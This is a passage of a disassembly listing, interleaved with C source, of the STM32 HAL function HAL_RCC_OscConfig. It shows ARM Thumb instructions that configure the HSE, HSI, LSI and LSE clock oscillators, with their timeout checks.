 8003cbe:	685b      	ldr	r3, [r3, #4]
 8003cc0:	f5b3 3f80 	cmp.w	r3, #65536	; 0x10000
 8003cc4:	d106      	bne.n	8003cd4 <HAL_RCC_OscConfig+0x24c>
 8003cc6:	4b0c      	ldr	r3, [pc, #48]	; (8003cf8 <HAL_RCC_OscConfig+0x270>)
 8003cc8:	681b      	ldr	r3, [r3, #0]
 8003cca:	4a0b      	ldr	r2, [pc, #44]	; (8003cf8 <HAL_RCC_OscConfig+0x270>)
 8003ccc:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8003cd0:	6013      	str	r3, [r2, #0]
 8003cd2:	e025      	b.n	8003d20 <HAL_RCC_OscConfig+0x298>
 8003cd4:	687b      	ldr	r3, [r7, #4]
 8003cd6:	685b      	ldr	r3, [r3, #4]
 8003cd8:	f5b3 2fa0 	cmp.w	r3, #327680	; 0x50000
 8003cdc:	d114      	bne.n	8003d08 <HAL_RCC_OscConfig+0x280>
 8003cde:	4b06      	ldr	r3, [pc, #24]	; (8003cf8 <HAL_RCC_OscConfig+0x270>)
 8003ce0:	681b      	ldr	r3, [r3, #0]
 8003ce2:	4a05      	ldr	r2, [pc, #20]	; (8003cf8 <HAL_RCC_OscConfig+0x270>)
 8003ce4:	f443 2380 	orr.w	r3, r3, #262144	; 0x40000
 8003ce8:	6013      	str	r3, [r2, #0]
 8003cea:	4b03      	ldr	r3, [pc, #12]	; (8003cf8 <HAL_RCC_OscConfig+0x270>)
 8003cec:	681b      	ldr	r3, [r3, #0]
 8003cee:	4a02      	ldr	r2, [pc, #8]	; (8003cf8 <HAL_RCC_OscConfig+0x270>)
 8003cf0:	f443 3380 	orr.w	r3, r3, #65536	; 0x10000
 8003cf4:	6013      	str	r3, [r2, #0]
 8003cf6:	e013      	b.n	8003d20 <HAL_RCC_OscConfig+0x298>
 8003cf8:	40021000 	.word	0x40021000
 8003cfc:	0800d400 	.word	0x0800d400
 8003d00:	20000000 	.word	0x20000000
 8003d04:	20000004 	.word	0x20000004
 8003d08:	4ba0      	ldr	r3, [pc, #640]	; (8003f8c <HAL_RCC_OscConfig+0x504>)
 8003d0a:	681b      	ldr	r3, [r3, #0]
 8003d0c:	4a9f      	ldr	r2, [pc, #636]	; (8003f8c <HAL_RCC_OscConfig+0x504>)
 8003d0e:	f423 3380 	bic.w	r3, r3, #65536	; 0x10000
 8003d12:	6013      	str	r3, [r2, #0]
 8003d14:	4b9d      	ldr	r3, [pc, #628]	; (8003f8c <HAL_RCC_OscConfig+0x504>)
 8003d16:	681b      	ldr	r3, [r3, #0]
 8003d18:	4a9c      	ldr	r2, [pc, #624]	; (8003f8c <HAL_RCC_OscConfig+0x504>)
 8003d1a:	f423 2380 	bic.w	r3, r3, #262144	; 0x40000
 8003d1e:	6013      	str	r3, [r2, #0]

      /* Check the HSE State */
      if(RCC_OscInitStruct->HSEState != RCC_HSE_OFF)
 8003d20:	687b      	ldr	r3, [r7, #4]
 8003d22:	685b      	ldr	r3, [r3, #4]
 8003d24:	2b00      	cmp	r3, #0
 8003d26:	d013      	beq.n	8003d50 <HAL_RCC_OscConfig+0x2c8>
      {
        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003d28:	f7fd fb2a 	bl	8001380 <HAL_GetTick>
 8003d2c:	6138      	str	r0, [r7, #16]

        /* Wait till HSE is ready */
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) == 0U)
 8003d2e:	e008      	b.n	8003d42 <HAL_RCC_OscConfig+0x2ba>
        {
          if((HAL_GetTick() - tickstart) > HSE_TIMEOUT_VALUE)
 8003d30:	f7fd fb26 	bl	8001380 <HAL_GetTick>
 8003d34:	4602      	mov	r2, r0
 8003d36:	693b      	ldr	r3, [r7, #16]
 8003d38:	1ad3      	subs	r3, r2, r3
 8003d3a:	2b64      	cmp	r3, #100	; 0x64
 8003d3c:	d901      	bls.n	8003d42 <HAL_RCC_OscConfig+0x2ba>
          {
            return HAL_TIMEOUT;
 8003d3e:	2303      	movs	r3, #3
 8003d40:	e2ae      	b.n	80042a0 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) == 0U)
 8003d42:	4b92      	ldr	r3, [pc, #584]	; (8003f8c <HAL_RCC_OscConfig+0x504>)
 8003d44:	681b      	ldr	r3, [r3, #0]
 8003d46:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8003d4a:	2b00      	cmp	r3, #0
 8003d4c:	d0f0      	beq.n	8003d30 <HAL_RCC_OscConfig+0x2a8>
 8003d4e:	e014      	b.n	8003d7a <HAL_RCC_OscConfig+0x2f2>
        }
      }
      else
      {
        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003d50:	f7fd fb16 	bl	8001380 <HAL_GetTick>
 8003d54:	6138      	str	r0, [r7, #16]

        /* Wait till HSE is disabled */
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U)
 8003d56:	e008      	b.n	8003d6a <HAL_RCC_OscConfig+0x2e2>
        {
          if((HAL_GetTick() - tickstart) > HSE_TIMEOUT_VALUE)
 8003d58:	f7fd fb12 	bl	8001380 <HAL_GetTick>
 8003d5c:	4602      	mov	r2, r0
 8003d5e:	693b      	ldr	r3, [r7, #16]
 8003d60:	1ad3      	subs	r3, r2, r3
 8003d62:	2b64      	cmp	r3, #100	; 0x64
 8003d64:	d901      	bls.n	8003d6a <HAL_RCC_OscConfig+0x2e2>
          {
            return HAL_TIMEOUT;
 8003d66:	2303      	movs	r3, #3
 8003d68:	e29a      	b.n	80042a0 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U)
 8003d6a:	4b88      	ldr	r3, [pc, #544]	; (8003f8c <HAL_RCC_OscConfig+0x504>)
 8003d6c:	681b      	ldr	r3, [r3, #0]
 8003d6e:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 8003d72:	2b00      	cmp	r3, #0
 8003d74:	d1f0      	bne.n	8003d58 <HAL_RCC_OscConfig+0x2d0>
 8003d76:	e000      	b.n	8003d7a <HAL_RCC_OscConfig+0x2f2>
      if((READ_BIT(RCC->CR, RCC_CR_HSERDY) != 0U) && (RCC_OscInitStruct->HSEState == RCC_HSE_OFF))
 8003d78:	bf00      	nop
        }
      }
    }
  }
  /*----------------------------- HSI Configuration --------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSI) == RCC_OSCILLATORTYPE_HSI)
 8003d7a:	687b      	ldr	r3, [r7, #4]
 8003d7c:	681b      	ldr	r3, [r3, #0]
 8003d7e:	f003 0302 	and.w	r3, r3, #2
 8003d82:	2b00      	cmp	r3, #0
 8003d84:	d060      	beq.n	8003e48 <HAL_RCC_OscConfig+0x3c0>
    /* Check the parameters */
    assert_param(IS_RCC_HSI(RCC_OscInitStruct->HSIState));
    assert_param(IS_RCC_HSI_CALIBRATION_VALUE(RCC_OscInitStruct->HSICalibrationValue));

    /* Check if HSI is used as system clock or as PLL source when PLL is selected as system clock */
    if((sysclk_source == RCC_CFGR_SWS_HSI) ||
 8003d86:	69bb      	ldr	r3, [r7, #24]
 8003d88:	2b04      	cmp	r3, #4
 8003d8a:	d005      	beq.n	8003d98 <HAL_RCC_OscConfig+0x310>
 8003d8c:	69bb      	ldr	r3, [r7, #24]
 8003d8e:	2b0c      	cmp	r3, #12
 8003d90:	d119      	bne.n	8003dc6 <HAL_RCC_OscConfig+0x33e>
       ((sysclk_source == RCC_CFGR_SWS_PLL) && (pll_config == RCC_PLLSOURCE_HSI)))
 8003d92:	697b      	ldr	r3, [r7, #20]
 8003d94:	2b02      	cmp	r3, #2
 8003d96:	d116      	bne.n	8003dc6 <HAL_RCC_OscConfig+0x33e>
    {
      /* When HSI is used as system clock it will not be disabled */
      if((READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U) && (RCC_OscInitStruct->HSIState == RCC_HSI_OFF))
 8003d98:	4b7c      	ldr	r3, [pc, #496]	; (8003f8c <HAL_RCC_OscConfig+0x504>)
 8003d9a:	681b      	ldr	r3, [r3, #0]
 8003d9c:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003da0:	2b00      	cmp	r3, #0
 8003da2:	d005      	beq.n	8003db0 <HAL_RCC_OscConfig+0x328>
 8003da4:	687b      	ldr	r3, [r7, #4]
 8003da6:	68db      	ldr	r3, [r3, #12]
 8003da8:	2b00      	cmp	r3, #0
 8003daa:	d101      	bne.n	8003db0 <HAL_RCC_OscConfig+0x328>
      {
        return HAL_ERROR;
 8003dac:	2301      	movs	r3, #1
 8003dae:	e277      	b.n	80042a0 <HAL_RCC_OscConfig+0x818>
      }
      /* Otherwise, just the calibration is allowed */
      else
      {
        /* Adjusts the Internal High Speed oscillator (HSI) calibration value.*/
        __HAL_RCC_HSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->HSICalibrationValue);
 8003db0:	4b76      	ldr	r3, [pc, #472]	; (8003f8c <HAL_RCC_OscConfig+0x504>)
 8003db2:	685b      	ldr	r3, [r3, #4]
 8003db4:	f023 52f8 	bic.w	r2, r3, #520093696	; 0x1f000000
 8003db8:	687b      	ldr	r3, [r7, #4]
 8003dba:	691b      	ldr	r3, [r3, #16]
 8003dbc:	061b      	lsls	r3, r3, #24
 8003dbe:	4973      	ldr	r1, [pc, #460]	; (8003f8c <HAL_RCC_OscConfig+0x504>)
 8003dc0:	4313      	orrs	r3, r2
 8003dc2:	604b      	str	r3, [r1, #4]
      if((READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U) && (RCC_OscInitStruct->HSIState == RCC_HSI_OFF))
 8003dc4:	e040      	b.n	8003e48 <HAL_RCC_OscConfig+0x3c0>
      }
    }
    else
    {
      /* Check the HSI State */
      if(RCC_OscInitStruct->HSIState != RCC_HSI_OFF)
 8003dc6:	687b      	ldr	r3, [r7, #4]
 8003dc8:	68db      	ldr	r3, [r3, #12]
 8003dca:	2b00      	cmp	r3, #0
 8003dcc:	d023      	beq.n	8003e16 <HAL_RCC_OscConfig+0x38e>
      {
        /* Enable the Internal High Speed oscillator (HSI). */
        __HAL_RCC_HSI_ENABLE();
 8003dce:	4b6f      	ldr	r3, [pc, #444]	; (8003f8c <HAL_RCC_OscConfig+0x504>)
 8003dd0:	681b      	ldr	r3, [r3, #0]
 8003dd2:	4a6e      	ldr	r2, [pc, #440]	; (8003f8c <HAL_RCC_OscConfig+0x504>)
 8003dd4:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 8003dd8:	6013      	str	r3, [r2, #0]

        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003dda:	f7fd fad1 	bl	8001380 <HAL_GetTick>
 8003dde:	6138      	str	r0, [r7, #16]

        /* Wait till HSI is ready */
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) == 0U)
 8003de0:	e008      	b.n	8003df4 <HAL_RCC_OscConfig+0x36c>
        {
          if((HAL_GetTick() - tickstart) > HSI_TIMEOUT_VALUE)
 8003de2:	f7fd facd 	bl	8001380 <HAL_GetTick>
 8003de6:	4602      	mov	r2, r0
 8003de8:	693b      	ldr	r3, [r7, #16]
 8003dea:	1ad3      	subs	r3, r2, r3
 8003dec:	2b02      	cmp	r3, #2
 8003dee:	d901      	bls.n	8003df4 <HAL_RCC_OscConfig+0x36c>
          {
            return HAL_TIMEOUT;
 8003df0:	2303      	movs	r3, #3
 8003df2:	e255      	b.n	80042a0 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) == 0U)
 8003df4:	4b65      	ldr	r3, [pc, #404]	; (8003f8c <HAL_RCC_OscConfig+0x504>)
 8003df6:	681b      	ldr	r3, [r3, #0]
 8003df8:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003dfc:	2b00      	cmp	r3, #0
 8003dfe:	d0f0      	beq.n	8003de2 <HAL_RCC_OscConfig+0x35a>
          }
        }

        /* Adjusts the Internal High Speed oscillator (HSI) calibration value.*/
        __HAL_RCC_HSI_CALIBRATIONVALUE_ADJUST(RCC_OscInitStruct->HSICalibrationValue);
 8003e00:	4b62      	ldr	r3, [pc, #392]	; (8003f8c <HAL_RCC_OscConfig+0x504>)
 8003e02:	685b      	ldr	r3, [r3, #4]
 8003e04:	f023 52f8 	bic.w	r2, r3, #520093696	; 0x1f000000
 8003e08:	687b      	ldr	r3, [r7, #4]
 8003e0a:	691b      	ldr	r3, [r3, #16]
 8003e0c:	061b      	lsls	r3, r3, #24
 8003e0e:	495f      	ldr	r1, [pc, #380]	; (8003f8c <HAL_RCC_OscConfig+0x504>)
 8003e10:	4313      	orrs	r3, r2
 8003e12:	604b      	str	r3, [r1, #4]
 8003e14:	e018      	b.n	8003e48 <HAL_RCC_OscConfig+0x3c0>
      }
      else
      {
        /* Disable the Internal High Speed oscillator (HSI). */
        __HAL_RCC_HSI_DISABLE();
 8003e16:	4b5d      	ldr	r3, [pc, #372]	; (8003f8c <HAL_RCC_OscConfig+0x504>)
 8003e18:	681b      	ldr	r3, [r3, #0]
 8003e1a:	4a5c      	ldr	r2, [pc, #368]	; (8003f8c <HAL_RCC_OscConfig+0x504>)
 8003e1c:	f423 7380 	bic.w	r3, r3, #256	; 0x100
 8003e20:	6013      	str	r3, [r2, #0]

        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003e22:	f7fd faad 	bl	8001380 <HAL_GetTick>
 8003e26:	6138      	str	r0, [r7, #16]

        /* Wait till HSI is disabled */
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U)
 8003e28:	e008      	b.n	8003e3c <HAL_RCC_OscConfig+0x3b4>
        {
          if((HAL_GetTick() - tickstart) > HSI_TIMEOUT_VALUE)
 8003e2a:	f7fd faa9 	bl	8001380 <HAL_GetTick>
 8003e2e:	4602      	mov	r2, r0
 8003e30:	693b      	ldr	r3, [r7, #16]
 8003e32:	1ad3      	subs	r3, r2, r3
 8003e34:	2b02      	cmp	r3, #2
 8003e36:	d901      	bls.n	8003e3c <HAL_RCC_OscConfig+0x3b4>
          {
            return HAL_TIMEOUT;
 8003e38:	2303      	movs	r3, #3
 8003e3a:	e231      	b.n	80042a0 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U)
 8003e3c:	4b53      	ldr	r3, [pc, #332]	; (8003f8c <HAL_RCC_OscConfig+0x504>)
 8003e3e:	681b      	ldr	r3, [r3, #0]
 8003e40:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003e44:	2b00      	cmp	r3, #0
 8003e46:	d1f0      	bne.n	8003e2a <HAL_RCC_OscConfig+0x3a2>
        }
      }
    }
  }
  /*------------------------------ LSI Configuration -------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_LSI) == RCC_OSCILLATORTYPE_LSI)
 8003e48:	687b      	ldr	r3, [r7, #4]
 8003e4a:	681b      	ldr	r3, [r3, #0]
 8003e4c:	f003 0308 	and.w	r3, r3, #8
 8003e50:	2b00      	cmp	r3, #0
 8003e52:	d03c      	beq.n	8003ece <HAL_RCC_OscConfig+0x446>
  {
    /* Check the parameters */
    assert_param(IS_RCC_LSI(RCC_OscInitStruct->LSIState));

    /* Check the LSI State */
    if(RCC_OscInitStruct->LSIState != RCC_LSI_OFF)
 8003e54:	687b      	ldr	r3, [r7, #4]
 8003e56:	695b      	ldr	r3, [r3, #20]
 8003e58:	2b00      	cmp	r3, #0
 8003e5a:	d01c      	beq.n	8003e96 <HAL_RCC_OscConfig+0x40e>
        MODIFY_REG(RCC->CSR, RCC_CSR_LSIPREDIV, RCC_OscInitStruct->LSIDiv);
      }
#endif /* RCC_CSR_LSIPREDIV */

      /* Enable the Internal Low Speed oscillator (LSI). */
      __HAL_RCC_LSI_ENABLE();
 8003e5c:	4b4b      	ldr	r3, [pc, #300]	; (8003f8c <HAL_RCC_OscConfig+0x504>)
 8003e5e:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003e62:	4a4a      	ldr	r2, [pc, #296]	; (8003f8c <HAL_RCC_OscConfig+0x504>)
 8003e64:	f043 0301 	orr.w	r3, r3, #1
 8003e68:	f8c2 3094 	str.w	r3, [r2, #148]	; 0x94

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003e6c:	f7fd fa88 	bl	8001380 <HAL_GetTick>
 8003e70:	6138      	str	r0, [r7, #16]

      /* Wait till LSI is ready */
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) == 0U)
 8003e72:	e008      	b.n	8003e86 <HAL_RCC_OscConfig+0x3fe>
      {
        if((HAL_GetTick() - tickstart) > LSI_TIMEOUT_VALUE)
 8003e74:	f7fd fa84 	bl	8001380 <HAL_GetTick>
 8003e78:	4602      	mov	r2, r0
 8003e7a:	693b      	ldr	r3, [r7, #16]
 8003e7c:	1ad3      	subs	r3, r2, r3
 8003e7e:	2b02      	cmp	r3, #2
 8003e80:	d901      	bls.n	8003e86 <HAL_RCC_OscConfig+0x3fe>
        {
          return HAL_TIMEOUT;
 8003e82:	2303      	movs	r3, #3
 8003e84:	e20c      	b.n	80042a0 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) == 0U)
 8003e86:	4b41      	ldr	r3, [pc, #260]	; (8003f8c <HAL_RCC_OscConfig+0x504>)
 8003e88:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003e8c:	f003 0302 	and.w	r3, r3, #2
 8003e90:	2b00      	cmp	r3, #0
 8003e92:	d0ef      	beq.n	8003e74 <HAL_RCC_OscConfig+0x3ec>
 8003e94:	e01b      	b.n	8003ece <HAL_RCC_OscConfig+0x446>
      }
    }
    else
    {
      /* Disable the Internal Low Speed oscillator (LSI). */
      __HAL_RCC_LSI_DISABLE();
 8003e96:	4b3d      	ldr	r3, [pc, #244]	; (8003f8c <HAL_RCC_OscConfig+0x504>)
 8003e98:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003e9c:	4a3b      	ldr	r2, [pc, #236]	; (8003f8c <HAL_RCC_OscConfig+0x504>)
 8003e9e:	f023 0301 	bic.w	r3, r3, #1
 8003ea2:	f8c2 3094 	str.w	r3, [r2, #148]	; 0x94

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003ea6:	f7fd fa6b 	bl	8001380 <HAL_GetTick>
 8003eaa:	6138      	str	r0, [r7, #16]

      /* Wait till LSI is disabled */
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) != 0U)
 8003eac:	e008      	b.n	8003ec0 <HAL_RCC_OscConfig+0x438>
      {
        if((HAL_GetTick() - tickstart) > LSI_TIMEOUT_VALUE)
 8003eae:	f7fd fa67 	bl	8001380 <HAL_GetTick>
 8003eb2:	4602      	mov	r2, r0
 8003eb4:	693b      	ldr	r3, [r7, #16]
 8003eb6:	1ad3      	subs	r3, r2, r3
 8003eb8:	2b02      	cmp	r3, #2
 8003eba:	d901      	bls.n	8003ec0 <HAL_RCC_OscConfig+0x438>
        {
          return HAL_TIMEOUT;
 8003ebc:	2303      	movs	r3, #3
 8003ebe:	e1ef      	b.n	80042a0 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) != 0U)
 8003ec0:	4b32      	ldr	r3, [pc, #200]	; (8003f8c <HAL_RCC_OscConfig+0x504>)
 8003ec2:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003ec6:	f003 0302 	and.w	r3, r3, #2
 8003eca:	2b00      	cmp	r3, #0
 8003ecc:	d1ef      	bne.n	8003eae <HAL_RCC_OscConfig+0x426>
        }
      }
    }
  }
  /*------------------------------ LSE Configuration -------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_LSE) == RCC_OSCILLATORTYPE_LSE)
 8003ece:	687b      	ldr	r3, [r7, #4]
 8003ed0:	681b      	ldr	r3, [r3, #0]
 8003ed2:	f003 0304 	and.w	r3, r3, #4
 8003ed6:	2b00      	cmp	r3, #0
 8003ed8:	f000 80a6 	beq.w	8004028 <HAL_RCC_OscConfig+0x5a0>
  {
    FlagStatus       pwrclkchanged = RESET;
 8003edc:	2300      	movs	r3, #0
 8003ede:	77fb      	strb	r3, [r7, #31]
    /* Check the parameters */
    assert_param(IS_RCC_LSE(RCC_OscInitStruct->LSEState));

    /* Update LSE configuration in Backup Domain control register    */
    /* Requires to enable write access to Backup Domain of necessary */
    if(HAL_IS_BIT_CLR(RCC->APB1ENR1, RCC_APB1ENR1_PWREN))
 8003ee0:	4b2a      	ldr	r3, [pc, #168]	; (8003f8c <HAL_RCC_OscConfig+0x504>)
 8003ee2:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003ee4:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8003ee8:	2b00      	cmp	r3, #0
 8003eea:	d10d      	bne.n	8003f08 <HAL_RCC_OscConfig+0x480>
    {
      __HAL_RCC_PWR_CLK_ENABLE();
 8003eec:	4b27      	ldr	r3, [pc, #156]	; (8003f8c <HAL_RCC_OscConfig+0x504>)
 8003eee:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003ef0:	4a26      	ldr	r2, [pc, #152]	; (8003f8c <HAL_RCC_OscConfig+0x504>)
 8003ef2:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 8003ef6:	6593      	str	r3, [r2, #88]	; 0x58
 8003ef8:	4b24      	ldr	r3, [pc, #144]	; (8003f8c <HAL_RCC_OscConfig+0x504>)
 8003efa:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003efc:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8003f00:	60bb      	str	r3, [r7, #8]
 8003f02:	68bb      	ldr	r3, [r7, #8]
      pwrclkchanged = SET;
 8003f04:	2301      	movs	r3, #1
 8003f06:	77fb      	strb	r3, [r7, #31]
    }

    if(HAL_IS_BIT_CLR(PWR->CR1, PWR_CR1_DBP))
 8003f08:	4b21      	ldr	r3, [pc, #132]	; (8003f90 <HAL_RCC_OscConfig+0x508>)
 8003f0a:	681b      	ldr	r3, [r3, #0]
 8003f0c:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8003f10:	2b00      	cmp	r3, #0
 8003f12:	d118      	bne.n	8003f46 <HAL_RCC_OscConfig+0x4be>
    {
      /* Enable write access to Backup domain */
      SET_BIT(PWR->CR1, PWR_CR1_DBP);
 8003f14:	4b1e      	ldr	r3, [pc, #120]	; (8003f90 <HAL_RCC_OscConfig+0x508>)
 8003f16:	681b      	ldr	r3, [r3, #0]
 8003f18:	4a1d      	ldr	r2, [pc, #116]	; (8003f90 <HAL_RCC_OscConfig+0x508>)
 8003f1a:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 8003f1e:	6013      	str	r3, [r2, #0]

      /* Wait for Backup domain Write protection disable */
      tickstart = HAL_GetTick();
 8003f20:	f7fd fa2e 	bl	8001380 <HAL_GetTick>
 8003f24:	6138      	str	r0, [r7, #16]

      while(HAL_IS_BIT_CLR(PWR->CR1, PWR_CR1_DBP))
 8003f26:	e008      	b.n	8003f3a <HAL_RCC_OscConfig+0x4b2>
      {
        if((HAL_GetTick() - tickstart) > RCC_DBP_TIMEOUT_VALUE)
 8003f28:	f7fd fa2a 	bl	8001380 <HAL_GetTick>
 8003f2c:	4602      	mov	r2, r0
 8003f2e:	693b      	ldr	r3, [r7, #16]
 8003f30:	1ad3      	subs	r3, r2, r3
 8003f32:	2b02      	cmp	r3, #2
 8003f34:	d901      	bls.n	8003f3a <HAL_RCC_OscConfig+0x4b2>
        {
          return HAL_TIMEOUT;
 8003f36:	2303      	movs	r3, #3
 8003f38:	e1b2      	b.n	80042a0 <HAL_RCC_OscConfig+0x818>
      while(HAL_IS_BIT_CLR(PWR->CR1, PWR_CR1_DBP))
 8003f3a:	4b15      	ldr	r3, [pc, #84]	; (8003f90 <HAL_RCC_OscConfig+0x508>)
 8003f3c:	681b      	ldr	r3, [r3, #0]
 8003f3e:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8003f42:	2b00      	cmp	r3, #0
 8003f44:	d0f0      	beq.n	8003f28 <HAL_RCC_OscConfig+0x4a0>
    {
      CLEAR_BIT(RCC->BDCR, RCC_BDCR_LSEON);
      CLEAR_BIT(RCC->BDCR, RCC_BDCR_LSEBYP);
    }
#else
    __HAL_RCC_LSE_CONFIG(RCC_OscInitStruct->LSEState);
 8003f46:	687b      	ldr	r3, [r7, #4]
 8003f48:	689b      	ldr	r3, [r3, #8]
 8003f4a:	2b01      	cmp	r3, #1
 8003f4c:	d108      	bne.n	8003f60 <HAL_RCC_OscConfig+0x4d8>
 8003f4e:	4b0f      	ldr	r3, [pc, #60]	; (8003f8c <HAL_RCC_OscConfig+0x504>)
 8003f50:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003f54:	4a0d      	ldr	r2, [pc, #52]	; (8003f8c <HAL_RCC_OscConfig+0x504>)
 8003f56:	f043 0301 	orr.w	r3, r3, #1
 8003f5a:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003f5e:	e029      	b.n	8003fb4 <HAL_RCC_OscConfig+0x52c>
 8003f60:	687b      	ldr	r3, [r7, #4]
 8003f62:	689b      	ldr	r3, [r3, #8]
 8003f64:	2b05      	cmp	r3, #5
 8003f66:	d115      	bne.n	8003f94 <HAL_RCC_OscConfig+0x50c>
 8003f68:	4b08      	ldr	r3, [pc, #32]	; (8003f8c <HAL_RCC_OscConfig+0x504>)
 8003f6a:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003f6e:	4a07      	ldr	r2, [pc, #28]	; (8003f8c <HAL_RCC_OscConfig+0x504>)
 8003f70:	f043 0304 	orr.w	r3, r3, #4
 8003f74:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003f78:	4b04      	ldr	r3, [pc, #16]	; (8003f8c <HAL_RCC_OscConfig+0x504>)
 8003f7a:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003f7e:	4a03      	ldr	r2, [pc, #12]	; (8003f8c <HAL_RCC_OscConfig+0x504>)
 8003f80:	f043 0301 	orr.w	r3, r3, #1
 8003f84:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003f88:	e014      	b.n	8003fb4 <HAL_RCC_OscConfig+0x52c>
 8003f8a:	bf00      	nop
 8003f8c:	40021000 	.word	0x40021000
 8003f90:	40007000 	.word	0x40007000
 8003f94:	4b9a      	ldr	r3, [pc, #616]	; (8004200 <HAL_RCC_OscConfig+0x778>)
 8003f96:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003f9a:	4a99      	ldr	r2, [pc, #612]	; (8004200 <HAL_RCC_OscConfig+0x778>)
 8003f9c:	f023 0301 	bic.w	r3, r3, #1
 8003fa0:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003fa4:	4b96      	ldr	r3, [pc, #600]	; (8004200 <HAL_RCC_OscConfig+0x778>)
 8003fa6:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003faa:	4a95      	ldr	r2, [pc, #596]	; (8004200 <HAL_RCC_OscConfig+0x778>)
 8003fac:	f023 0304 	bic.w	r3, r3, #4
 8003fb0:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
#endif /* RCC_BDCR_LSESYSDIS */

    /* Check the LSE State */
    if(RCC_OscInitStruct->LSEState != RCC_LSE_OFF)
 8003fb4:	687b      	ldr	r3, [r7, #4]
 8003fb6:	689b      	ldr	r3, [r3, #8]
 8003fb8:	2b00      	cmp	r3, #0
 8003fba:	d016      	beq.n	8003fea <HAL_RCC_OscConfig+0x562>
    {
      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003fbc:	f7fd f9e0 	bl	8001380 <HAL_GetTick>
 8003fc0:	6138      	str	r0, [r7, #16]

      /* Wait till LSE is ready */
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 8003fc2:	e00a      	b.n	8003fda <HAL_RCC_OscConfig+0x552>
      {
        if((HAL_GetTick() - tickstart) > RCC_LSE_TIMEOUT_VALUE)
 8003fc4:	f7fd f9dc 	bl	8001380 <HAL_GetTick>
 8003fc8:	4602      	mov	r2, r0
 8003fca:	693b      	ldr	r3, [r7, #16]
 8003fcc:	1ad3      	subs	r3, r2, r3
 8003fce:	f241 3288 	movw	r2, #5000	; 0x1388
 8003fd2:	4293      	cmp	r3, r2
 8003fd4:	d901      	bls.n	8003fda <HAL_RCC_OscConfig+0x552>
        {
          return HAL_TIMEOUT;
 8003fd6:	2303      	movs	r3, #3
 8003fd8:	e162      	b.n	80042a0 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 8003fda:	4b89      	ldr	r3, [pc, #548]	; (8004200 <HAL_RCC_OscConfig+0x778>)
 8003fdc:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003fe0:	f003 0302 	and.w	r3, r3, #2
 8003fe4:	2b00      	cmp	r3, #0
 8003fe6:	d0ed      	beq.n	8003fc4 <HAL_RCC_OscConfig+0x53c>
 8003fe8:	e015      	b.n	8004016 <HAL_RCC_OscConfig+0x58e>
      }
    }
    else
    {
      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003fea:	f7fd f9c9 	bl	8001380 <HAL_GetTick>
 8003fee:	6138      	str	r0, [r7, #16]

      /* Wait till LSE is disabled */
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) != 0U)
 8003ff0:	e00a      	b.n	8004008 <HAL_RCC_OscConfig+0x580>
      {
